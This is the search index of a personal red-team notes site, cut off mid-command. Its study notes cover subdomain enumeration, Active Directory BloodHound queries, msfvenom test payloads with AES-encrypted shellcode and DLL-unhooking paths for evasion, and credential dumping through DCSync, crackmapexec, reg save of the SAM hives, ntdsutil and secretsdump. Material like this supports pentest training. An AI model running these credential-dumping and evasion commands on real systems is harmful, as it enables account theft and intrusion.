{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome Welcome to my mkdocs playground. Just playing with this at the moment.","title":"Home"},{"location":"#welcome","text":"Welcome to my mkdocs playground. Just playing with this at the moment.","title":"Welcome"},{"location":"OSINT/subdomain-enumeration/","text":"Subdomain Enumeration Amass Reverse Whois method tries to find other domains with similar whois records( -whois ): amass intel -d <domain> -whois SSL Certificate Grabbing will grabv the SSL certificate from every IP provided( -active ): amass intel -active -cidr <network-range> Identify ASNs: amass intel -org \"<company-name>\" ASNs ( -asn ) can be used with the SSL certificate grabbing feature( -active ). amass intel -active -asn <asn-number> Putting it all together: amass intel -asn <asn-number> -whois -d <domain> Basic subdomain enumeration method ( -d ): amass enum -d <domain> VHOST Discovery with ffuf Useful for finding subdomains without using DNS records. This method fuzzes the Host header parameter in HTTP requests. The same can be done with Burp Suites Intruder feature. ffuf -w wordlist.txt -u https://site.com/ -H \"Host: FUZZ.site.com\" In my experience this generates a lot of false positives and requires the use of filters. Identify a commonality in false positives such as amount of words, number of lines, or resenpose size. -fw : to filter by the amount of words -fl : to filter by the number of lines -fs : to filter by the size of the response -fc : to filter by the status code -fr : to filter by the regex pattern References https://hakluke.medium.com/haklukes-guide-to-amass-how-to-use-amass-more-effectively-for-bug-bounties-7c37570b83f7 https://medium.com/quiknapp/fuzz-faster-with-ffuf-c18c031fc480 https://github.com/ffuf/ffuf","title":"Subdomain Enumeration"},{"location":"OSINT/subdomain-enumeration/#subdomain-enumeration","text":"","title":"Subdomain Enumeration"},{"location":"OSINT/subdomain-enumeration/#amass","text":"Reverse Whois method tries to find other domains with similar whois records( -whois ): amass intel -d <domain> -whois SSL Certificate Grabbing will grabv the SSL certificate from every IP provided( -active ): amass intel -active -cidr <network-range> Identify ASNs: amass intel -org \"<company-name>\" ASNs ( -asn ) can be used with the SSL certificate grabbing feature( -active ). amass intel -active -asn <asn-number> Putting it all together: amass intel -asn <asn-number> -whois -d <domain> Basic subdomain enumeration method ( -d ): amass enum -d <domain>","title":"Amass"},{"location":"OSINT/subdomain-enumeration/#vhost-discovery-with-ffuf","text":"Useful for finding subdomains without using DNS records. This method fuzzes the Host header parameter in HTTP requests. The same can be done with Burp Suites Intruder feature. ffuf -w wordlist.txt -u https://site.com/ -H \"Host: FUZZ.site.com\" In my experience this generates a lot of false positives and requires the use of filters. Identify a commonality in false positives such as amount of words, number of lines, or resenpose size. -fw : to filter by the amount of words -fl : to filter by the number of lines -fs : to filter by the size of the response -fc : to filter by the status code -fr : to filter by the regex pattern","title":"VHOST Discovery with ffuf"},{"location":"OSINT/subdomain-enumeration/#references","text":"https://hakluke.medium.com/haklukes-guide-to-amass-how-to-use-amass-more-effectively-for-bug-bounties-7c37570b83f7 https://medium.com/quiknapp/fuzz-faster-with-ffuf-c18c031fc480 https://github.com/ffuf/ffuf","title":"References"},{"location":"malwaredev/go-aes-encryption/","text":"Creating an AES Cryptor in Go The goal of this is to make an executable that take a raw binary file, like the one output by Cobalt Strike. I want to take that input and output a C style array.","title":"Creating an AES Cryptor in Go"},{"location":"malwaredev/go-aes-encryption/#creating-an-aes-cryptor-in-go","text":"The goal of this is to make an executable that take a raw binary file, like the one output by Cobalt Strike. I want to take that input and output a C style array.","title":"Creating an AES Cryptor in Go"},{"location":"malwaredev/payload-testing/","text":"Payload Testing Resources MSFVenvom Popping calc for payload testing. calc exe msfvenom -p windows/x64/exec CMD=\"C:\\Windows\\System32\\calc.exe\" -f exe -o calc.exe calc dll msfvenom -p windows/x64/exec CMD=\"C:\\Windows\\System32\\calc.exe\" -f dll -o calc.dll calc bin msfvenom -p windows/x64/exec CMD=\"C:\\Windows\\System32\\calc.exe\" -f raw -o calc.bin AES Encrypted calc.bin file AES Key { 0x77, 0xa6, 0x84, 0x46, 0x5f, 0xa, 0x77, 0xcd, 0xd2, 0x49, 0x30, 0xb4, 0x7d, 0x20, 0x14, 0x2d }; Encrypted Calc { 0x83, 0x22, 0xa5, 0x80, 0xea, 0x6e, 0x27, 0x83, 0x6d, 0xf7, 0x49, 0x86, 0x17, 0x25, 0x5a, 0x4e, 0xeb, 0x96, 0x1f, 0x5b, 0xf, 0x2, 0x86, 0x45, 0xf8, 0x36, 0x75, 0x5c, 0xc9, 0xab, 0x31, 0xa4, 0xaa, 0x51, 0x9e, 0xb4, 0x6d, 0xfa, 0x19, 0xcc, 0x3, 0x51, 0x1b, 0x20, 0x42, 0xf8, 0x53, 0x6, 0xce, 0x72, 0xd9, 0xeb, 0x75, 0xc9, 0x77, 0x77, 0xc4, 0xa0, 0xf8, 0xd7, 0x22, 0xc1, 0x6e, 0x29, 0xac, 0x70, 0xd4, 0xc5, 0x7b, 0x92, 0x16, 0x2, 0xb3, 0xa6, 0x84, 0x56, 0xb4, 0x67, 0xe3, 0xc9, 0x64, 0xe9, 0xeb, 0x23, 0x91, 0xa4, 0xed, 0xd3, 0x36, 0x53, 0x93, 0x1d, 0xf8, 0xe9, 0xac, 0xaf, 0x2d, 0xed, 0xc9, 0x50, 0x4a, 0xdf, 0x8f, 0x61, 0x24, 0x93, 0xce, 0xd8, 0xa9, 0x33, 0xb7, 0x39, 0x52, 0x3b, 0xea, 0x7a, 0x3f, 0x6a, 0xfe, 0x9d, 0xae, 0x93, 0x6, 0x8c, 0x6d, 0xb3, 0x22, 0x8e, 0xd0, 0xc2, 0x2e, 0x95, 0x4b, 0x87, 0x32, 0x1d, 0xd2, 0xf7, 0xa5, 0x80, 0x79, 0x27, 0x7b, 0x12, 0xac, 0x27, 0x8, 0x1c, 0x9e, 0x3, 0x87, 0xcd, 0x47, 0x93, 0xe, 0x51, 0x5, 0x44, 0x71, 0x2e, 0x8b, 0x7a, 0x6c, 0xf, 0xe4, 0x7, 0x72, 0xd4, 0xdb, 0x3d, 0x97, 0x5, 0xd1, 0xf2, 0xe7, 0x11, 0x39, 0x26, 0x6d, 0x26, 0x3, 0x5f, 0xff, 0x2d, 0x77, 0x7a, 0x6a, 0x48, 0x90, 0xd6, 0x1e, 0x2a, 0x1d, 0xf1, 0x8b, 0xc4, 0x83, 0x26, 0xe, 0xdc, 0x3f, 0xe4, 0xc6, 0x11, 0x9e, 0x48, 0x7d, 0x26, 0x2e, 0x43, 0x9c, 0x37, 0xd3, 0x6, 0x6f, 0x37, 0x2e, 0xf4, 0xe3, 0x85, 0xe0, 0x9e, 0x9d, 0x15, 0xa1, 0x29, 0x23, 0xc1, 0x5e, 0x10, 0x74, 0x46, 0x45, 0xaa, 0x83, 0x2, 0x41, 0xd7, 0x3f, 0x6f, 0xf1, 0x25, 0x56, 0xc2, 0x7d, 0xb1, 0xd0, 0xeb, 0x2b, 0x4a, 0x2a, 0x1d, 0xd9, 0x48, 0x17, 0xbd, 0xd1, 0xde, 0x20, 0x46, 0xc2, 0x5e, 0x94, 0x52, 0x63, 0x53, 0x68, 0xcb, 0x3d, 0x4, 0x9b, 0xce, 0x22, 0x7b, 0x84, 0x14, 0x25, 0x50, 0x57, 0x67, 0x33, 0xfa, 0xa4, 0x50, 0x3, 0x7d, 0x52, 0x34, 0x67, 0xf7, 0x22, 0xb7, 0xac, 0xa8, 0xfe, 0xec, 0x52, 0x9e, 0x1c, 0x8a, 0x5f, 0xb3, 0x38, 0xc7 }; AES Encrypted Paths to Kernel32 and NTDLL I use these for the classic unhook method where I copy a fresh DLL from disk. //AES Encrypted NTDLLPath c:\\windows\\system32\\ntdll.dll unsigned char sNtdllPath[] = { 0x20, 0x3b, 0x9, 0x6f, 0xcd, 0x1e, 0x9f, 0xd, 0xb0, 0x7b, 0x4f, 0xd3, 0x28, 0xf4, 0x1e, 0xb1, 0xb1, 0xfa, 0x21, 0xf6, 0x2b, 0x64, 0x31, 0x95, 0x98, 0x84, 0x11, 0x2c, 0xa2, 0xd7, 0xe0, 0x13 }; unsigned char sntdllkey[] = { 0xb4, 0x4b, 0xfb, 0xfa, 0x4b, 0xf8, 0x26, 0x99, 0x51, 0x5c, 0x78, 0x13, 0xa4, 0xa9, 0x37, 0x1b }; unsigned int sNtdllPath_len = sizeof(sNtdllPath); //AES Encrypted Kernel32 path c:\\windows\\system32\\kernel32.dll unsigned char sKernel32Path[] = { 0x19, 0xd7, 0x19, 0xda, 0x46, 0xe5, 0x59, 0xe1, 0x8e, 0xfe, 0x40, 0x35, 0xef, 0xfa, 0x69, 0x2, 0x94, 0x4c, 0xf1, 0xe, 0xc5, 0xde, 0xc4, 0x72, 0xc8, 0xa, 0x26, 0x34, 0x84, 0xa2, 0x83, 0x3a, 0xf9, 0x1c, 0xdb, 0x10, 0xed, 0x26, 0xed, 0x71, 0xd6, 0x28, 0x79, 0x17, 0xd3, 0x1a, 0x8f, 0xc2 }; unsigned char sKernel32key[] = { 0x2b, 0xf4, 0xa8, 0x69, 0xce, 0xcb, 0x9a, 0xec, 0xd9, 0x63, 0x52, 0xee, 0xc2, 0x5e, 0x5b, 0x9f }; unsigned int sKernel32_len = sizeof(sKernel32Path);","title":"Payload Testing Snippets"},{"location":"malwaredev/payload-testing/#payload-testing-resources","text":"","title":"Payload Testing Resources"},{"location":"malwaredev/payload-testing/#msfvenvom","text":"Popping calc for payload testing. calc exe msfvenom -p windows/x64/exec CMD=\"C:\\Windows\\System32\\calc.exe\" -f exe -o calc.exe calc dll msfvenom -p windows/x64/exec CMD=\"C:\\Windows\\System32\\calc.exe\" -f dll -o calc.dll calc bin msfvenom -p windows/x64/exec CMD=\"C:\\Windows\\System32\\calc.exe\" -f raw -o calc.bin","title":"MSFVenvom"},{"location":"malwaredev/payload-testing/#aes-encrypted-calcbin-file","text":"AES Key { 0x77, 0xa6, 0x84, 0x46, 0x5f, 0xa, 0x77, 0xcd, 0xd2, 0x49, 0x30, 0xb4, 0x7d, 0x20, 0x14, 0x2d }; Encrypted Calc { 0x83, 0x22, 0xa5, 0x80, 0xea, 0x6e, 0x27, 0x83, 0x6d, 0xf7, 0x49, 0x86, 0x17, 0x25, 0x5a, 0x4e, 0xeb, 0x96, 0x1f, 0x5b, 0xf, 0x2, 0x86, 0x45, 0xf8, 0x36, 0x75, 0x5c, 0xc9, 0xab, 0x31, 0xa4, 0xaa, 0x51, 0x9e, 0xb4, 0x6d, 0xfa, 0x19, 0xcc, 0x3, 0x51, 0x1b, 0x20, 0x42, 0xf8, 0x53, 0x6, 0xce, 0x72, 0xd9, 0xeb, 0x75, 0xc9, 0x77, 0x77, 0xc4, 0xa0, 0xf8, 0xd7, 0x22, 0xc1, 0x6e, 0x29, 0xac, 0x70, 0xd4, 0xc5, 0x7b, 0x92, 0x16, 0x2, 0xb3, 0xa6, 0x84, 0x56, 0xb4, 0x67, 0xe3, 0xc9, 0x64, 0xe9, 0xeb, 0x23, 0x91, 0xa4, 0xed, 0xd3, 0x36, 0x53, 0x93, 0x1d, 0xf8, 0xe9, 0xac, 0xaf, 0x2d, 0xed, 0xc9, 0x50, 0x4a, 0xdf, 0x8f, 0x61, 0x24, 0x93, 0xce, 0xd8, 0xa9, 0x33, 0xb7, 0x39, 0x52, 0x3b, 0xea, 0x7a, 0x3f, 0x6a, 0xfe, 0x9d, 0xae, 0x93, 0x6, 0x8c, 0x6d, 0xb3, 0x22, 0x8e, 0xd0, 0xc2, 0x2e, 0x95, 0x4b, 0x87, 0x32, 0x1d, 0xd2, 0xf7, 0xa5, 0x80, 0x79, 0x27, 0x7b, 0x12, 0xac, 0x27, 0x8, 0x1c, 0x9e, 0x3, 0x87, 0xcd, 0x47, 0x93, 0xe, 0x51, 0x5, 0x44, 0x71, 0x2e, 0x8b, 0x7a, 0x6c, 0xf, 0xe4, 0x7, 0x72, 0xd4, 0xdb, 0x3d, 0x97, 0x5, 0xd1, 0xf2, 0xe7, 0x11, 0x39, 0x26, 0x6d, 0x26, 0x3, 0x5f, 0xff, 0x2d, 0x77, 0x7a, 0x6a, 0x48, 0x90, 0xd6, 0x1e, 0x2a, 0x1d, 0xf1, 0x8b, 0xc4, 0x83, 0x26, 0xe, 0xdc, 0x3f, 0xe4, 0xc6, 0x11, 0x9e, 0x48, 0x7d, 0x26, 0x2e, 0x43, 0x9c, 0x37, 0xd3, 0x6, 0x6f, 0x37, 0x2e, 0xf4, 0xe3, 0x85, 0xe0, 0x9e, 0x9d, 0x15, 0xa1, 0x29, 0x23, 0xc1, 0x5e, 0x10, 0x74, 0x46, 0x45, 0xaa, 0x83, 0x2, 0x41, 0xd7, 0x3f, 0x6f, 0xf1, 0x25, 0x56, 0xc2, 0x7d, 0xb1, 0xd0, 0xeb, 0x2b, 0x4a, 0x2a, 0x1d, 0xd9, 0x48, 0x17, 0xbd, 0xd1, 0xde, 0x20, 0x46, 0xc2, 0x5e, 0x94, 0x52, 0x63, 0x53, 0x68, 0xcb, 0x3d, 0x4, 0x9b, 0xce, 0x22, 0x7b, 0x84, 0x14, 0x25, 0x50, 0x57, 0x67, 0x33, 0xfa, 0xa4, 0x50, 0x3, 0x7d, 0x52, 0x34, 0x67, 0xf7, 0x22, 0xb7, 0xac, 0xa8, 0xfe, 0xec, 0x52, 0x9e, 0x1c, 0x8a, 0x5f, 0xb3, 0x38, 0xc7 };","title":"AES Encrypted calc.bin file"},{"location":"malwaredev/payload-testing/#aes-encrypted-paths-to-kernel32-and-ntdll","text":"I use these for the classic unhook method where I copy a fresh DLL from disk. //AES Encrypted NTDLLPath c:\\windows\\system32\\ntdll.dll unsigned char sNtdllPath[] = { 0x20, 0x3b, 0x9, 0x6f, 0xcd, 0x1e, 0x9f, 0xd, 0xb0, 0x7b, 0x4f, 0xd3, 0x28, 0xf4, 0x1e, 0xb1, 0xb1, 0xfa, 0x21, 0xf6, 0x2b, 0x64, 0x31, 0x95, 0x98, 0x84, 0x11, 0x2c, 0xa2, 0xd7, 0xe0, 0x13 }; unsigned char sntdllkey[] = { 0xb4, 0x4b, 0xfb, 0xfa, 0x4b, 0xf8, 0x26, 0x99, 0x51, 0x5c, 0x78, 0x13, 0xa4, 0xa9, 0x37, 0x1b }; unsigned int sNtdllPath_len = sizeof(sNtdllPath); //AES Encrypted Kernel32 path c:\\windows\\system32\\kernel32.dll unsigned char sKernel32Path[] = { 0x19, 0xd7, 0x19, 0xda, 0x46, 0xe5, 0x59, 0xe1, 0x8e, 0xfe, 0x40, 0x35, 0xef, 0xfa, 0x69, 0x2, 0x94, 0x4c, 0xf1, 0xe, 0xc5, 0xde, 0xc4, 0x72, 0xc8, 0xa, 0x26, 0x34, 0x84, 0xa2, 0x83, 0x3a, 0xf9, 0x1c, 0xdb, 0x10, 0xed, 0x26, 0xed, 0x71, 0xd6, 0x28, 0x79, 0x17, 0xd3, 0x1a, 0x8f, 0xc2 }; unsigned char sKernel32key[] = { 0x2b, 0xf4, 0xa8, 0x69, 0xce, 0xcb, 0x9a, 0xec, 0xd9, 0x63, 0x52, 0xee, 0xc2, 0x5e, 0x5b, 0x9f }; unsigned int sKernel32_len = sizeof(sKernel32Path);","title":"AES Encrypted Paths to Kernel32 and NTDLL"},{"location":"malwaredev/pe-file-format/","text":"PE File Format Essentials My notes on the PE file format as I go through the Sektor 7 Malware Course. Microsoft Documentation: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format Important Concepts Name Description File Pointer An offset within the disk. The location of an item within the file itself, before being processed by the linker (in the case of object files) or the loader (in the case of image files). In other words, this is a position within the file as stored on disk. Relative Virtual Address (RVA) In an image file, this is the address of an item after it is loaded into memory, with the base address of the image file subtracted from it. The RVA of an item almost always differs from its position within the file on disk (file pointer).In an object file, an RVA is less meaningful because memory locations are not assigned. In this case, an RVA would be an address within a section (described later in this table), to which a relocation is later applied during linking. For simplicity, a compiler should just set the first RVA in each section to zero.","title":"PE Format Essentials"},{"location":"malwaredev/pe-file-format/#pe-file-format-essentials","text":"My notes on the PE file format as I go through the Sektor 7 Malware Course. Microsoft Documentation: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format Important Concepts Name Description File Pointer An offset within the disk. The location of an item within the file itself, before being processed by the linker (in the case of object files) or the loader (in the case of image files). In other words, this is a position within the file as stored on disk. Relative Virtual Address (RVA) In an image file, this is the address of an item after it is loaded into memory, with the base address of the image file subtracted from it. The RVA of an item almost always differs from its position within the file on disk (file pointer).In an object file, an RVA is less meaningful because memory locations are not assigned. In this case, an RVA would be an address within a section (described later in this table), to which a relocation is later applied during linking. For simplicity, a compiler should just set the first RVA in each section to zero.","title":"PE File Format Essentials"},{"location":"web-app/chrome-dev-tools/","text":"Google Chrome DevTools Chrome DevTools is awesome and let's you view several aspects of the web applications such as loaded scripts, view requests and responses, view headers, and more. To open the chrome DevTools pannel hit F12 or CTRL+SHIFT+I. Panels in DevTools: Panel Function Elements Allows you to view the current page\u2019s CSS and Document Object Model (DOM), which enables you to inspect the HTML that constructs the web page. Console Provides you with alerts and lets you interact with the JavaScript debugger to alter the current web page. Sources Contains the directories that make up the web application and the content of the source files. Network Lists all the source file requests that make up the client\u2019s perspective of the web application Performance Provides a way to record and analyze all the events that take place when loading a web page Memory Lets you record and analyze how the browser is interacting with your system\u2019s memory. Application Provides you with the application manifest, storage items (like cookies and session information), cache, and background services. Security Provides insight regarding the transit encryption, source content orgins, and certificate details.","title":"Chrome DevTools"},{"location":"web-app/chrome-dev-tools/#google-chrome-devtools","text":"Chrome DevTools is awesome and let's you view several aspects of the web applications such as loaded scripts, view requests and responses, view headers, and more. To open the chrome DevTools pannel hit F12 or CTRL+SHIFT+I. Panels in DevTools: Panel Function Elements Allows you to view the current page\u2019s CSS and Document Object Model (DOM), which enables you to inspect the HTML that constructs the web page. Console Provides you with alerts and lets you interact with the JavaScript debugger to alter the current web page. Sources Contains the directories that make up the web application and the content of the source files. Network Lists all the source file requests that make up the client\u2019s perspective of the web application Performance Provides a way to record and analyze all the events that take place when loading a web page Memory Lets you record and analyze how the browser is interacting with your system\u2019s memory. Application Provides you with the application manifest, storage items (like cookies and session information), cache, and background services. Security Provides insight regarding the transit encryption, source content orgins, and certificate details.","title":"Google Chrome DevTools"},{"location":"windowsexploitation/bloodhound-cyphers/","text":"Computers with Descriptions MATCH (c:Computer) WHERE c.description IS NOT NULL RETURN c.name,c.description Find all computers with Unconstrained Delegation MATCH (c:Computer {unconstraineddelegation:true}) return c Find All computer without LAPS and return Computer Name and Date Last Changed in human readable format MATCH (C:Computer {enabled: true}) WHERE C.haslaps = false RETURN C.name, datetime({epochSeconds: toInteger(C.pwdlastset) }) Find every user object where the \u201cuserpassword\u201d attribute is populated MATCH (u:User) WHERE NOT u.userpassword IS null RETURN u.name,u.userpassword Find if any domain user has interesting permissions against a GPO: MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p LIMIT 25 Finds all groups that are not \"Admin\" groups but still have local admin over systems MATCH p=(n:Group)-[:AdminTo*1..]->(m:Computer) WHERE not n.admincount RETURN DISTINCT n.name, n.admincount, COUNT(m.name) ORDER BY COUNT(m.name) DESC Find Groups that can reset passwords MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN m.name, n.name ORDER BY m.name Find what groups have local admin rights MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name Finding Unsupported Operating Systems MATCH (H:Computer {enabled: true}) WHERE H.operatingsystem =~ '.*(2000|2003|2008|xp|vista|7|me)*.' RETURN H.name, H.operatingsystem Find users that have never logged on and account is still active MATCH (n:User) WHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE RETURN n.name ORDER BY n.name Kerberoastable Users with a path to DA MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.name CONTAINS 'DOMAIN ADMINS' MATCH p = shortestPath( (u)-[*1..]->(g) ) RETURN p List All user GenericALL Rights Modify as needed to find group over computer, or User over group GenericAll rights or other rights. MATCH (u:User)-[:GenericAll]->(c:User) RETURN u.name, c.name Non-Admin Users only MATCH (u:User{admincount:false})-[:GenericAll]->(c:User) RETURN u.name, c.name User Generic rights over computer and not local admin to computer MATCH (u:User)-[:GenericAll]->(c:Computer) WHERE NOT u.admincount AND NOT (u)-[:AdminTo]->(c) RETURN u.name, c.name List All Domain Admins MATCH (u:User)-[:MemberOf]->(g:Group {name:'DOMAIN ADMINS@<domain>'}) return u.name, u.displayname Match users that are not AdminCount 1, have generic all over computers, and no local admin This should be looking for explicit permissions of users. Not sure if it checks for group delegated permissions. MATCH (u:User)-[:GenericAll]->(c:Computer) WHERE NOT u.admincount AND NOT (u)-[:AdminTo]->(c) RETURN u.name, c.name Match users that are not AdminCount 1, have generic all over other users, and no local admin MATCH (u:User)-[:GenericAll]->(c:User) WHERE NOT u.admincount AND NOT (u)-[:AdminTo]->(c) RETURN u.name, c.name Match users that are not AdminCount 1, have generic all over other groups, and no local admin Match users that are not AdminCount 1, have generic all over othre users, and no local admin Non Admin users with privileged ACL\u2019s like genericALL or force password change MATCH (n:User {admincount:False}) MATCH (m:User) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:AllExtendedRights|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(m)) RETURN p Unconstrained Delegation that aren\u2019t domain controllers MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectsid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2.name,c2.operatingsystem,c2.distinguishedname ORDER BY c2.name ASC Users with Descriptions MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.name,u.description References https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/ https://gist.github.com/joeminicucci/d9fb42f03186f6aaa556cc5f961f537b https://blog.cptjesus.com/posts/introtocypher","title":"Bloodhound Cyphers"},{"location":"windowsexploitation/bloodhound-cyphers/#computers-with-descriptions","text":"MATCH (c:Computer) WHERE c.description IS NOT NULL RETURN c.name,c.description","title":"Computers with Descriptions"},{"location":"windowsexploitation/bloodhound-cyphers/#find-all-computers-with-unconstrained-delegation","text":"MATCH (c:Computer {unconstraineddelegation:true}) return c","title":"Find all computers with Unconstrained Delegation"},{"location":"windowsexploitation/bloodhound-cyphers/#find-all-computer-without-laps-and-return-computer-name-and-date-last-changed-in-human-readable-format","text":"MATCH (C:Computer {enabled: true}) WHERE C.haslaps = false RETURN C.name, datetime({epochSeconds: toInteger(C.pwdlastset) })","title":"Find All computer without LAPS and return Computer Name and Date Last Changed in human readable format"},{"location":"windowsexploitation/bloodhound-cyphers/#find-every-user-object-where-the-userpassword-attribute-is-populated","text":"MATCH (u:User) WHERE NOT u.userpassword IS null RETURN u.name,u.userpassword","title":"Find every user object where the \u201cuserpassword\u201d attribute is populated"},{"location":"windowsexploitation/bloodhound-cyphers/#find-if-any-domain-user-has-interesting-permissions-against-a-gpo","text":"MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p LIMIT 25","title":"Find if any domain user has interesting permissions against a GPO:"},{"location":"windowsexploitation/bloodhound-cyphers/#finds-all-groups-that-are-not-admin-groups-but-still-have-local-admin-over-systems","text":"MATCH p=(n:Group)-[:AdminTo*1..]->(m:Computer) WHERE not n.admincount RETURN DISTINCT n.name, n.admincount, COUNT(m.name) ORDER BY COUNT(m.name) DESC","title":"Finds all groups that are not \"Admin\" groups but still have local admin over systems"},{"location":"windowsexploitation/bloodhound-cyphers/#find-groups-that-can-reset-passwords","text":"MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN m.name, n.name ORDER BY m.name","title":"Find Groups that can reset passwords"},{"location":"windowsexploitation/bloodhound-cyphers/#find-what-groups-have-local-admin-rights","text":"MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name","title":"Find what groups have local admin rights"},{"location":"windowsexploitation/bloodhound-cyphers/#finding-unsupported-operating-systems","text":"MATCH (H:Computer {enabled: true}) WHERE H.operatingsystem =~ '.*(2000|2003|2008|xp|vista|7|me)*.' RETURN H.name, H.operatingsystem","title":"Finding Unsupported Operating Systems"},{"location":"windowsexploitation/bloodhound-cyphers/#find-users-that-have-never-logged-on-and-account-is-still-active","text":"MATCH (n:User) WHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE RETURN n.name ORDER BY n.name","title":"Find users that have never logged on and account is still active"},{"location":"windowsexploitation/bloodhound-cyphers/#kerberoastable-users-with-a-path-to-da","text":"MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.name CONTAINS 'DOMAIN ADMINS' MATCH p = shortestPath( (u)-[*1..]->(g) ) RETURN p","title":"Kerberoastable Users with a path to DA"},{"location":"windowsexploitation/bloodhound-cyphers/#list-all-user-genericall-rights","text":"Modify as needed to find group over computer, or User over group GenericAll rights or other rights. MATCH (u:User)-[:GenericAll]->(c:User) RETURN u.name, c.name Non-Admin Users only MATCH (u:User{admincount:false})-[:GenericAll]->(c:User) RETURN u.name, c.name User Generic rights over computer and not local admin to computer MATCH (u:User)-[:GenericAll]->(c:Computer) WHERE NOT u.admincount AND NOT (u)-[:AdminTo]->(c) RETURN u.name, c.name","title":"List All user GenericALL Rights"},{"location":"windowsexploitation/bloodhound-cyphers/#list-all-domain-admins","text":"MATCH (u:User)-[:MemberOf]->(g:Group {name:'DOMAIN ADMINS@<domain>'}) return u.name, u.displayname","title":"List All Domain Admins"},{"location":"windowsexploitation/bloodhound-cyphers/#match-users-that-are-not-admincount-1-have-generic-all-over-computers-and-no-local-admin","text":"This should be looking for explicit permissions of users. Not sure if it checks for group delegated permissions. MATCH (u:User)-[:GenericAll]->(c:Computer) WHERE NOT u.admincount AND NOT (u)-[:AdminTo]->(c) RETURN u.name, c.name","title":"Match users that are not AdminCount 1, have generic all over computers, and no local admin"},{"location":"windowsexploitation/bloodhound-cyphers/#match-users-that-are-not-admincount-1-have-generic-all-over-other-users-and-no-local-admin","text":"MATCH (u:User)-[:GenericAll]->(c:User) WHERE NOT u.admincount AND NOT (u)-[:AdminTo]->(c) RETURN u.name, c.name","title":"Match users that are not AdminCount 1, have generic all over other users, and no local admin"},{"location":"windowsexploitation/bloodhound-cyphers/#match-users-that-are-not-admincount-1-have-generic-all-over-other-groups-and-no-local-admin","text":"Match users that are not AdminCount 1, have generic all over othre users, and no local admin","title":"Match users that are not AdminCount 1, have generic all over other groups, and no local admin"},{"location":"windowsexploitation/bloodhound-cyphers/#non-admin-users-with-privileged-acls-like-genericall-or-force-password-change","text":"MATCH (n:User {admincount:False}) MATCH (m:User) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:AllExtendedRights|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(m)) RETURN p","title":"Non Admin users with privileged ACL\u2019s like genericALL or force password change"},{"location":"windowsexploitation/bloodhound-cyphers/#unconstrained-delegation-that-arent-domain-controllers","text":"MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectsid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2.name,c2.operatingsystem,c2.distinguishedname ORDER BY c2.name ASC","title":"Unconstrained Delegation that aren\u2019t domain controllers"},{"location":"windowsexploitation/bloodhound-cyphers/#users-with-descriptions","text":"MATCH (u:User) WHERE u.description IS NOT NULL RETURN u.name,u.description","title":"Users with Descriptions"},{"location":"windowsexploitation/bloodhound-cyphers/#references","text":"https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/ https://gist.github.com/joeminicucci/d9fb42f03186f6aaa556cc5f961f537b https://blog.cptjesus.com/posts/introtocypher","title":"References"},{"location":"windowsexploitation/credential-dumping/","text":"Methods of Credential Dumping DCSync Cobalt Strike Cobalt Strike offers the \u201cdcsync\u201d command which is a wrapper for mimikatz. If you have domain admin trust established with the domain controller, this will replicate all user's NTLM hashes. The command dcsync is a shortcut for mimikatz @lsadump::dcsync /domain:<domain.fqdn /all /csv dcsyn <domain.fqdn> CrackMapExec Supports dumping NTDS via VSS or DRSUAPI. Specifying the method is optional. crackmapexec smb <target> -u admin -p Password123 -d domain --ntds <drsuapi|vss> Manual DCSync using vssadmin reg save hklm\\sam SAM reg save hklm\\system SYSTEM reg save hklm\\security SECURITY Manual NTDS.dit Extraction using ntdsutil ntdsutil \"ac in ntds\" i \"cr fu c:\\temp\" q q After doing one of the two manual methods, convert to a readable format with impacket on your local system. impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL Local SAM and LSA Cobalt Strike Use the built-in hashdump command to dump local SAM hashes. Impacket Use secretsdump.py to extract credentials remotely. You can do this using a password, NTLM Hash, or with a Kerberos ticket. Also supports extracting credentials from local files. Extract with NTLM hash: secretsdump.py -hashes :6d9dc9bd065d9f9a628b0f1a0c54c976 domain\\username@target Extract with password: secretsdump.py domain\\username:password@target Extract with Kerberos Ticket: secretsdump.py domain\\username@target -k -no-pass To extract with Kerberos ticket first request a TGT with asktgt.py then apply the TGS ticket with export KRB5CCNAME= {.is-info} CrackMapExec Extract hashes from SAM using plaintext password(-p flag): crackmapexec smb <target> -u admin -p Password123 -d domain --sam Extract hashes from LSA using NTLM hash (-H flag): crackmapexec smb <target> -u admin -H <NTLM_HASH> -d domain --lsa SeatBelt Extract hashes from Security Auth Packages. By default this is usually just NTLMv2. Seatbelt.exe SecPackageCreds Manual Method From the compromised machines, navigate to C:\\Windows\\System32\\Config. This is where the SAM, SYSTEM, and Security hives are located. You cant create a copy using copy because there\u2019s a write block on the files. Save to another location using reg save: reg save hklm\\sam SAM reg 